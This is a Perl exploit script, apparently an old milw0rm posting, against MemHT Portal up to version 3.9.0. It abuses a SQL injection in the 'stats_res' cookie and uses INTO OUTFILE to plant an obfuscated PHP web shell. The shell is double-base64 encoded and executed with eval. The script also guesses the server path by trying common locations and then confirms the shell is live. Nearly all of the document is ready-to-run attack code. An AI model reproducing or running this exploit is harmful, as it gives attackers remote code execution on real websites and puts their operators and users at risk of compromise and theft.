#!/usr/bin/perl
#
# MemHT Portal <= 3.9.0 Perl exploit
#
# discovered & written by Ams
# ax330d [doggy] gmail [dot] com
#
# DESCRIPTION:
#	Script /inc/inc_statistics.php accepts unfiltered $_COOKIE's,
#	($_COOKIE['stats_res']) which later goes to MySQL request. So we are able to make
#	sql injection.
#	This exploit tries to create shell in /uploads/media/defined.php.
#
# NEEDED:
#	magic_quotes_gpc = off
#	MySQL should be able to write to file
#	Know full server path to portal

use strict;
use warnings;
use IO::Socket;

print "
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	MemHT portal <= 3.9.0 Perl exploit
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	";

@ARGV or &usage ;
my $expl_url = shift;
$expl_url =~ m#http://# or &usage;
my $serv_path = shift || '-b';
my $def_shell = '/uploads/media/defined.php';

my $shell = '\%3C\%3Fphp\%20\%24s\%3D\%27YVhOelpYUW9KRjlRVDFOVVd5ZHdhSEJwYm1adkoxMHBQMlJwWlNod2FIQnBibVp2S0NrcE9q'
.'QTdKR0ZzYkdZOUp6eGthWFlnWTJ4aGMzTTlJbUp2ZUNJK0p6c2thRDF2Y0dWdVpHbHlLQ2N1SnlrN2QyaHBiR1VvUmtGTVUwVWhQ'
.'VDBvSkdZOWNtVmhaR1JwY2lna2FDa3BLWHNrWVd4c1ppNDlKR1l1Snp4aWNpOCtKenQ5Q2lSbGNqMGtabXc5SnljN0pITnRQU2M4'
.'WkdsMklHTnNZWE56UFNKdVptOGlQa2x1Wm04NlczTmhabVZmYlc5a1pUMG5MbWx1YVY5blpYUW9KM05oWm1WZmJXOWtaU2NwTGlk'
.'ZEptNWljM0E3VzJkc2IySmhiSE05Snk1cGJtbGZaMlYwS0NkeVpXZHBjM1JsY2w5bmJHOWlZV3h6SnlrdUoxMG1ibUp6Y0R0YmJX'
.'Rm5hV05mY1hWdmRHVnpYMmR3WXowbkxtbHVhVjluWlhRb0oyMWhaMmxqWDNGMWIzUmxjMTluY0dNbktTNG5YU1p1WW5Od08xdGth'
.'WE5oWW14bFpGOW1kVzVqZEdsdmJuTTlKeTVwYm1sZloyVjBLQ2RrYVhOaFlteGxaRjltZFc1amRHbHZibk1uS1M0blhTWnVZbk53'
.'T3p4aWNpOCtXM0JvY0RvbkxuQm9jSFpsY25OcGIyNG9LUzRuWFNadVluTndPMXQxYzJWeU9pY3VaMlYwWDJOMWNuSmxiblJmZFhO'
.'bGNpZ3BMaWRkSm01aWMzQTdQR0p5THo1YmRXNWhiV1U2Snk1d2FIQmZkVzVoYldVb0tTNG5YU1p1WW5Od096d3ZaR2wyUGp4aWNp'
.'OCtKenNLYVdZb2FYTnpaWFFvSkY5UVQxTlVXeWR6WlhRblhTa3BlMmxtS0dselgzVndiRzloWkdWa1gyWnBiR1VvSkY5R1NVeEZV'
.'MXNuWm1rblhWc25kRzF3WDI1aGJXVW5YU2twSUdsbUtDRnRiM1psWDNWd2JHOWhaR1ZrWDJacGJHVW9KRjlHU1V4RlUxc25abWtu'
.'WFZzbmRHMXdYMjVoYldVblhTd2tYMFpKVEVWVFd5ZG1hU2RkV3lkdVlXMWxKMTBwS1NBa2MyMHVQU2M4YzNCaGJpQmpiR0Z6Y3ow'
.'aVpYSnliM0lpUGtOdmRXeGtJRzV2ZENCdGIzWmxJSFZ3Ykc5aFpHVmtJR1pwYkdVaFBDOXpjR0Z1UGljN0NtbG1LQ0ZsYlhCMGVT'
.'Z2tYMUJQVTFSYkoyVjJZV3duWFNrcGUyOWlYM04wWVhKMEtDazdaWFpoYkNna1gxQlBVMVJiSjJWMllXd25YU2s3SkhOdExqMXZZ'
.'bDluWlhSZlkyeGxZVzRvS1R0OUlXVnRjSFI1S0NSZlVFOVRWRnNuWlhobFl5ZGRLVDhrYzIwdVBTYzhjSEpsUGljdVlDUmZVRTlU'
.'VkZ0bGVHVmpYV0F1Snp3dmNISmxQaWM2TURzaFpXMXdkSGtvSkY5UVQxTlVXeWQyWmlkZEtUOGtabXc5YUdsbmFHeHBaMmgwWDJa'
.'cGJHVW9KRjlRVDFOVVd5ZDJaaWRkS1Rvd08zMEtaV05vYnlBblBHaDBiV3crUEdobFlXUStQSFJwZEd4bFBpNHVMblJ0Y0NCemFH'
.'VnNiQzR1TGp3dmRHbDBiR1UrUEcxbGRHRWdhSFIwY0MxbGNYVnBkajBpUTI5dWRHVnVkQzFVZVhCbElpQmpiMjUwWlc1MFBTSjBa'
.'WGgwTDJoMGJXdzdJR05vWVhKelpYUTlkMmx1Wkc5M2N5MHhNalV4SWk4K0NqeHpkSGxzWlNCMGVYQmxQU0owWlhoMEwyTnpjeUkr'
.'Q21KdlpIbDdabTl1ZEMxbVlXMXBiSGs2ZG1WeVpHRnVZU3hoY21saGJDeHpaWEpwWmp0aVlXTnJaM0p2ZFc1a0xXTnZiRzl5T2lN'
.'ek16TTdZMjlzYjNJNkkyWTVaamxtT1R0bWIyNTBMWE5wZW1VNk1UQndlRHQ5Q2k1aWIzaDdjRzl6YVhScGIyNDZjbVZzWVhScGRt'
.'VTdabXh2WVhRNmJHVm1kRHRpYjNKa1pYSTZNWEI0SUhOdmJHbGtJQ00yTmpZN1ltRmphMmR5YjNWdVpDMWpiMnh2Y2pvak16TXpP'
.'MjFoY21kcGJqbzFPMjFoY21kcGJpMTBiM0E2TWpCd2VEdHdZV1JrYVc1bk9qRXdjSGc3ZDJsa2RHZzZZWFYwYnp0OUNpNXVabTk3'
.'WW05eVpHVnlPakZ3ZUNCemIyeHBaQ0FqT1RrNU8ySmhZMnRuY205MWJtUXRZMjlzYjNJNkl6WTJOanR3WVdSa2FXNW5PalZ3ZUR0'
.'OUNpNW9hV1JsZTJOdmJHOXlPaU0wTkRRN2ZXbHVjSFYwZTJKaFkydG5jbTkxYm1RdFkyOXNiM0k2SXpZMk5qdGliM0prWlhJNk1Y'
.'QjRJSE52Ykdsa0lDTTVPVGs3ZlhSaFlteGxlMlp2Ym5RdGMybDZaVG94TUhCNE8ySnZjbVJsY2kxamIyeHNZWEJ6WlRwamIyeHNZ'
.'WEJ6WlR0OWFXNXdkWFI3YldGeVoybHVPakp3ZUR0OUNqd3ZjM1I1YkdVK1BDOW9aV0ZrUGp4aWIyUjVQaWN1SkdGc2JHWXVKend2'
.'WkdsMlBpY3VKR1pzTGljOFpHbDJJR05zWVhOelBTSmliM2dpUGljdUpITnRMaWNLUEdadmNtMGdaVzVqZEhsd1pUMGliWFZzZEds'
.'d1lYSjBMMlp2Y20wdFpHRjBZU0lnWVdOMGFXOXVQU0lpSUcxbGRHaHZaRDBpY0c5emRDSStDanh3UGp4cGJuQjFkQ0IwZVhCbFBT'
.'SnpkV0p0YVhRaUlHNWhiV1U5SW5Cb2NHbHVabThpSUhaaGJIVmxQU0p3YUhCcGJtWnZJaTgrUEM5d1BqeDBZV0pzWlQ0S1BIUnlQ'
.'angwWkQ1MWNHeHZZV1E2UEM5MFpENDhkR1ErUEdsdWNIVjBJSFI1Y0dVOUltWnBiR1VpSUc1aGJXVTlJbVpwSWk4K1BDOTBaRDQ4'
.'TDNSeVBnbzhkSEkrUEhSa1BtTnRaRG84TDNSa1BqeDBaRDQ4YVc1d2RYUWdkSGx3WlQwaWRHVjRkQ0lnYm1GdFpUMGlaWGhsWXlJ'
.'Z2RtRnNkV1U5SWlJdlBqd3ZkR1ErUEM5MGNqNEtQSFJ5UGp4MFpENWxkbUZzT2p3dmRHUStQSFJrUGp4cGJuQjFkQ0IwZVhCbFBT'
.'SjBaWGgwSWlCdVlXMWxQU0psZG1Gc0lpQjJZV3gxWlQwaUlpOCtQQzkwWkQ0OEwzUnlQZ284ZEhJK1BIUmtQblpwWlhjZ1ptbHNa'
.'VG84TDNSa1BqeDBaRDQ4YVc1d2RYUWdkSGx3WlQwaWRHVjRkQ0lnYm1GdFpUMGlkbVlpSUhaaGJIVmxQU0lpUGladVluTndPeTlw'
.'Ym1OZlkyOXVabWxuTG5Cb2NDQS9JRHNwUEM5MFpENDhMM1J5UGp3dmRHRmliR1UrUEhBK0NqeHBibkIxZENCMGVYQmxQU0p6ZFdK'
.'dGFYUWlJRzVoYldVOUluTmxkQ0lnZG1Gc2RXVTlJazlySWk4K1BDOXdQZ284TDJadmNtMCtQSE53WVc0Z1kyeGhjM005SW1ocFpH'
.'VWlQbUo1SUVGdGN5QW9ZV3RoSUdGNE16TXdaQ2s4TDNOd1lXNCtQQzlrYVhZK1BDOWliMlI1UGp3dmFIUnRiRDRuT3c9PQ==\%27'
.'\%3Beval\%28base64_decode\%28base64_decode\%28\%24s\%29\%29\%29\%3B';

#	You can add more :P
my @paths = qw(
	/var/www/htdocs /var/www/localhost/htdocs /var/www /var/wwww/hosting /var/www/html /var/www/vhosts
	/home/www  home/httpd/vhosts
	/usr/local/apache/htdocs
	/www/htdocs
);

if($serv_path ne '-b') {
	@paths = ($serv_path);
}

exploit($expl_url);

sub exploit {
	
	#	Defining vars.
	my $url = pop @_;
	
	print "\n\tExploiting $url\n";
	
	my($host, $path, $packet, $rcvd);
    $url =~ s#http://(.*?)(|/(.*?))\z#$host=$1 and ($path=$2)=~s/\/\z//#e;
	
	#	Trying to get /cron.php to get server path
	$packet = "POST $path/cron.php HTTP/1.1\r\n";
	$packet .= "Host: $host\r\n";
	$packet .= "Connection: Close\r\n";
	$packet .= "Content-Type: application/x-www-form-urlencoded\r\n\r\n";
	$rcvd = send_pckt($host, $packet, 1);
	
	if( ! $rcvd) {
		print "\n\tUnable to connect to http://$host\n\n";
		exit;
	}
	if ($rcvd =~ /Undefined variable:/) {
		$rcvd =~ /f\s+in\s+(.*?)$path\/inc\/inc_readConfig/;
		@paths = ($1);
		print "\n\tFound path!\n";
	} else {
		print "\n\tStarting bruteforce...\n";
	}
	
	#	Some bruteforce here if path is not defined
	foreach $serv_path (@paths) {
		
		print ("\n\tTesting $serv_path$path$def_shell ...\n");
		#	Sending poisoned request
		$packet = "POST $path/index.php HTTP/1.1\r\n";
		$packet .= "Host: $host\r\n";
		$packet .= "Cookie: stats_res=1680x1050' UNION SELECT '$shell ' into outfile '$serv_path$path$def_shell'--\%20\r\n";
		$packet .= "Connection: Close\r\n";
		$packet .= "Content-Type: application/x-www-form-urlencoded\r\n\r\n";
		
		if( ! send_pckt($host, $packet)) {
			print "\n\tUnable to connect to http://$host\n\n";
			exit;
		}
	}

	#	Checking for shell presence
	$packet = "POST $path$def_shell HTTP/1.1\r\n";
	$packet .= "Host: $host\r\n";
	$packet .= "Connection: Close\r\n";
	$packet .= "Content-Type: application/x-www-form-urlencoded\r\n\r\n";
	
	sleep(1);
	$rcvd = send_pckt($host, $packet, 1);
	if( ! $rcvd) {
		print "\n\tUnable to connect to http://$host\n\n";
		exit;
	}

	if ($rcvd =~ /tmp\s+shell/) {
		print "\n\tExploited!\n\n";
	} else {
		print "\n\tExploiting failed.\n\n";
	}
	
}

sub send_pckt() {
		
	my $dat = 1;
	my ($host, $packet, $ret) = @_;
	my $socket = IO::Socket::INET->new(
		Proto=>"tcp",
		PeerAddr=>$host,
		PeerPort=>"80"
	);
	if( ! $socket) {
		return 0;
	} else {
		
		print $socket $packet;
		if($ret) {
			my $rcv;
			while($rcv = <$socket>) {
			$dat .= $rcv;
			}
		}
		close $socket;
		return $dat;
	}
}

sub usage {
	print "\n\tUsage:\texpl.pl host [-b|full server path]

	(by default exlpoit checks /cron.php file errors to get real path,
	otherwise it will brute if failed, if used -b or none path is mentioned)

	Example:\t$0 http://localhost/ /var/www/htdocs
			$0 http://localhost/ -b
			$0 http://localhost/\n\n";
	exit;
}

# milw0rm.com [2008-09-06]
